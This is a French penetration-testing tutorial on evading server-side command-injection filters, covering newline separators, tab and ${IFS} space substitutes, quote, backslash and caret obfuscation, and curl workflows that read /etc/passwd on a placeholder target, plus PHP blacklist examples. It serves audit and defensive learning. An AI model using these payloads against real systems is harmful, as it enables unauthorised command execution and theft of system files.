# Contournement de filtres

## Pourquoi

Les développeurs conscients du risque d'injection de commandes mettent en place des filtres côté serveur pour bloquer les caractères et les commandes dangereuses. Un filtre basique suffit à neutraliser les tentatives les plus évidentes, mais il reste souvent contournable. Comprendre comment ces filtres fonctionnent, identifier ce qu'ils bloquent et trouver les failles dans leur logique est une compétence essentielle en audit web. Cette page couvre les techniques de contournement des filtres de caractères, d'espaces et de commandes.

## Comment ça marche

### Identifier le type de filtre

Quand un payload retourne un message du type "Invalid input", un mécanisme de filtrage est actif. La première étape consiste à déterminer ce qui bloque la requête.

{% tabs %}
{% tab title="Filtre applicatif" %}
Si le message d'erreur apparaît dans le champ de sortie habituel de l'application (là où s'affichent normalement les résultats), le filtre est probablement implémenté dans le code de l'application elle-même (PHP, NodeJS, etc.).

```php
$blacklist = ['&', '|', ';', ' ', ...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```
{% endtab %}

{% tab title="WAF" %}
Si la réponse est une page différente, contenant des informations comme l'adresse IP de l'utilisateur et les détails de la requête, c'est probablement un Web Application Firewall (WAF) qui intercepte en amont. Les techniques de contournement diffèrent selon la couche qui bloque.
{% endtab %}
{% endtabs %}

### Identifier les caractères bloqués

La méthode la plus fiable consiste à tester caractère par caractère. On part d'un input valide et on ajoute un seul caractère à la fois :

| Test | Résultat attendu | Conclusion |
|---|---|---|
| `127.0.0.1` | Sortie normale (ping) | L'IP seule passe |
| `127.0.0.1;` | "Invalid input" | Le `;` est blacklisté |
| `127.0.0.1%0a` | Sortie normale | Le retour à la ligne n'est pas filtré |
| `127.0.0.1%0a ` | "Invalid input" | L'espace est blacklisté |

Ce processus d'élimination permet de construire un payload qui n'utilise aucun caractère filtré.

### Contourner les opérateurs d'injection

Les opérateurs classiques (`;`, `&&`, `||`, `&`, `|`) sont presque toujours blacklistés. Mais le retour à la ligne (`%0a`) est rarement filtré, car il peut être nécessaire dans certains inputs légitimes.

Le retour à la ligne fonctionne comme séparateur de commandes sur Linux et Windows :

```bash
# - Équivalent de 127.0.0.1; whoami
# - Le %0a sépare les deux commandes
127.0.0.1%0awhoami
```

{% hint style="info" %}
Le retour à la ligne (`%0a`, soit `\n`) est le premier opérateur à tester quand les autres sont bloqués. Il fonctionne sur les deux systèmes d'exploitation et passe sous le radar de la majorité des filtres basiques.
{% endhint %}

### Contourner le filtre d'espaces

L'espace est un caractère fréquemment blacklisté, surtout quand l'input attendu n'en contient pas (une adresse IP par exemple). Trois alternatives permettent de le remplacer :

{% tabs %}
{% tab title="Tabulation (%09)" %}
La tabulation est acceptée comme séparateur d'arguments par les shells Linux et Windows. En URL encoding, elle correspond à `%09` :

```bash
# - Remplacer l'espace par une tabulation
127.0.0.1%0a%09whoami
```

Le serveur interprète `%09` comme une tabulation, et le shell exécute la commande normalement.
{% endtab %}

{% tab title="${IFS}" %}
La variable `${IFS}` (Internal Field Separator) a pour valeur par défaut un espace et une tabulation sous Linux. On peut l'utiliser à la place d'un espace entre les arguments :

```bash
# - ${IFS} est remplacé par un espace au moment de l'exécution
127.0.0.1%0a${IFS}whoami
```

{% hint style="warning" %}
`${IFS}` est spécifique aux shells Linux (bash, sh). Cette technique ne fonctionne pas sur Windows CMD ou PowerShell.
{% endhint %}
{% endtab %}

{% tab title="Brace Expansion" %}
L'expansion d'accolades du shell bash ajoute automatiquement des espaces entre les éléments :

```bash
# - Le shell expanse {ls,-la} en "ls -la"
127.0.0.1%0a{ls,-la}
```

Cette technique est particulièrement utile quand la commande et ses arguments doivent être collés ensemble.
{% endtab %}
{% endtabs %}

### Contourner les commandes blacklistées

Au-delà des caractères, certains filtres vérifient la présence de commandes spécifiques (whoami, cat, id, etc.) dans l'input. Le filtre compare l'input contre une liste de mots interdits :

```php
$blacklist = ['whoami', 'cat', 'id', 'passwd', ...];
foreach ($blacklist as $word) {
    if (strpos($_POST['ip'], $word) !== false) {
        echo "Invalid input";
    }
}
```

Ce type de filtre cherche une correspondance exacte. Si on modifie légèrement l'apparence de la commande, elle échappe au filtre tout en restant exécutable par le shell.

{% tabs %}
{% tab title="Linux + Windows" %}
**Insertion de guillemets**

Le shell ignore les guillemets simples et doubles insérés dans une commande :

```bash
# - Guillemets simples
w'h'o'am'i

# - Guillemets doubles
w"h"o"am"i
```

Règles à respecter :
- Ne pas mélanger les types de guillemets dans la même commande
- Le nombre de guillemets doit être pair
{% endtab %}

{% tab title="Linux seulement" %}
**Backslash**

Le backslash échappe le caractère suivant, mais dans ce contexte le shell l'ignore simplement :

```bash
w\ho\am\i
```

Contrairement aux guillemets, le nombre de backslashs n'a pas besoin d'être pair.

**Variable vide $@**

La variable `$@` est vide quand elle n'est pas dans un script avec des arguments. Le shell l'ignore :

```bash
who$@ami
```
{% endtab %}

{% tab title="Windows seulement" %}
**Caret (^)**

Le caret est le caractère d'échappement de CMD. Inséré dans une commande, il est ignoré à l'exécution :

```batch
who^ami
```

Cette technique fonctionne uniquement dans CMD, pas dans PowerShell.
{% endtab %}
{% endtabs %}

## En pratique

### Workflow de contournement depuis Exegol

```bash
# - Étape 1 : vérifier que l'input de base fonctionne
curl -s -X POST "http://<IP_CIBLE>:<PORT>/" -d "ip=127.0.0.1"

# - Étape 2 : tester le retour à la ligne comme opérateur
curl -s -X POST "http://<IP_CIBLE>:<PORT>/" -d "ip=127.0.0.1%0a"

# - Étape 3 : ajouter une commande avec tabulation au lieu d'espace
curl -s -X POST "http://<IP_CIBLE>:<PORT>/" -d "ip=127.0.0.1%0a%09whoami"

# - Étape 4 : si la commande est bloquée, utiliser les guillemets
curl -s -X POST "http://<IP_CIBLE>:<PORT>/" -d "ip=127.0.0.1%0a%09w'h'o'am'i"

# - Étape 5 : combiner toutes les techniques
curl -s -X POST "http://<IP_CIBLE>:<PORT>/" --data-urlencode "ip=127.0.0.1
	c'a't${IFS}/e't'c/pa's'swd"
```

{% hint style="success" %}
En pratique, on combine plusieurs techniques dans le même payload. Un payload typique utilise `%0a` comme opérateur, `%09` ou `${IFS}` pour les espaces, et des guillemets dans les noms de commandes et fichiers.
{% endhint %}

### Tester systématiquement les opérateurs

Si le premier opérateur testé est bloqué, parcourir la liste complète :

```bash
# - Tester chaque opérateur un par un
for op in '%0a' '%3b' '%26' '%7c' '%26%26' '%7c%7c'; do
    echo "[*] Test opérateur: $op"
    curl -s -o /dev/null -w "%{http_code} - taille: %{size_download}" \
         -X POST "http://<IP_CIBLE>:<PORT>/" \
         -d "ip=127.0.0.1${op}"
    echo ""
done
```

## Pièges et galères

- **Espaces oubliés** : après avoir contourné l'opérateur et la commande, l'espace reste souvent le bloquant. Toujours penser à le remplacer dans chaque argument, y compris dans les chemins de fichiers (`/etc/passwd` contient des `/` qui peuvent aussi être filtrés)
- **Encodage URL** : dans Burp, ne pas oublier d'encoder les caractères spéciaux (espace → `+` ou `%20`, tabulation → `%09`). Une tabulation littérale dans le champ ne sera pas interprétée correctement
- **Guillemets déséquilibrés** : un nombre impair de guillemets simples ou doubles provoque une erreur de syntaxe shell, pas un "Invalid input". Si la réponse change de nature, c'est probablement un guillemet mal fermé
- **${IFS} avec des chemins** : `${IFS}` ne peut pas remplacer un séparateur de chemin (`/`). Pour les slashs filtrés, il faut utiliser d'autres techniques (variables d'environnement, encodage)
- **Filtre insensible à la casse** : certains filtres comparent en minuscules. `W'H'O'AM'I` peut être bloqué si le filtre applique `strtolower()` avant la comparaison

## Retour terrain

En audit, la première chose à faire face à un filtre est de caractériser précisément ce qu'il bloque. Envoyer un payload complexe qui échoue ne donne aucune information utile. Le test caractère par caractère est moins spectaculaire mais nettement plus efficace.

Le retour à la ligne (`%0a`) reste l'opérateur de contournement le plus fiable. Il passe les filtres basiques dans la grande majorité des cas. La combinaison `%0a` + `%09` + guillemets forme un trio de base qui résout la plupart des situations.

Sur les applications plus robustes, les filtres vérifient aussi les sous-chaînes. `c'a't` peut être bloqué si le filtre reconstruit la commande avant de la comparer. Dans ces cas, les techniques d'obfuscation avancée (encodage base64, inversion de commande, manipulation de casse) deviennent nécessaires.

## Mémo express

| Filtre | Technique | Exemple |
|---|---|---|
| Opérateur `;` bloqué | Retour à la ligne | `%0a` |
| Espace bloqué | Tabulation | `%09` |
| Espace bloqué | Variable IFS | `${IFS}` |
| Espace bloqué | Brace expansion | `{cmd,arg}` |
| Commande bloquée | Guillemets simples | `w'h'o'am'i` |
| Commande bloquée | Guillemets doubles | `w"h"o"am"i` |
| Commande bloquée (Linux) | Backslash | `w\ho\am\i` |
| Commande bloquée (Linux) | Variable vide | `who$@ami` |
| Commande bloquée (Windows) | Caret | `who^ami` |

***
